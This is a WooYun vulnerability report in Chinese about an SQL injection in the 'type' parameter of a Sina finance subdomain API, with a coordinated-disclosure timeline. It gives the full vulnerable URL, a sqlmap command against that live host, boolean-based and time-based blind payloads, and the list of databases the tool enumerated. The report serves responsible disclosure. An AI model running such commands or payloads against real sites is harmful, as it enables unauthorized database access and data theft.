wybug_detail: 漏洞详情 披露状态：   									2014-09-01：	细节已通知厂商并且等待厂商处理中									2014-09-02：	厂商已经确认，细节仅向厂商公开									2014-09-12：	细节向核心白帽子及相关领域专家公开									2014-09-22：	细节向普通白帽子公开									2014-10-02：	细节向实习白帽子公开									2014-10-16：	细节向公众公开  简要描述： 新浪某分站SQL注入 详细说明：  http://stock2.finance.sina.com.cn/sf/api/jsonp.php/aaa=johansen082447293183438691409578322670/dataService.getNoticeList?type=%E5%85%B6%E4%BB%96&index=1&court=&pageNum=undefined注入点： type   漏洞证明：  root@bt:/pentest/database/sqlmap# python sqlmap.py -u "http://stock2.finance.sina.com.cn/sf/api/jsonp.php/aaa=johansen082447293183438691409578322670/dataService.getNoticeList?type=%E5%85%B6%E4%BB%96&index=1&court=&pageNum=undefined" -p type --dbms=mysql --dbs    sqlmap/1.0-dev-25eca9d - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 21:58:29[21:58:29] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: type    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=其他' AND 4082=4082 AND 'xfgz'='xfgz&index=1&court=&pageNum=undefined    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: type=其他' AND SLEEP(5) AND 'weDc'='weDc&index=1&court=&pageNum=undefined---[21:58:29] [INFO] testing MySQL[21:58:30] [INFO] confirming MySQL[21:58:31] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL >= 5.0.0[21:58:31] [INFO] fetching database names[21:58:31] [INFO] fetching number of databases[21:58:31] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[21:58:31] [INFO] retrieved: 3[21:58:34] [INFO] retrieved: information_schema[21:59:31] [INFO] retrieved: sf_db[21:59:49] [INFO] retrieved: testavailable databases [3]:[*] information_schema[*] sf_db[*] test   修复方案：  过滤   版权声明：转载请注明来源 Jannock@乌云
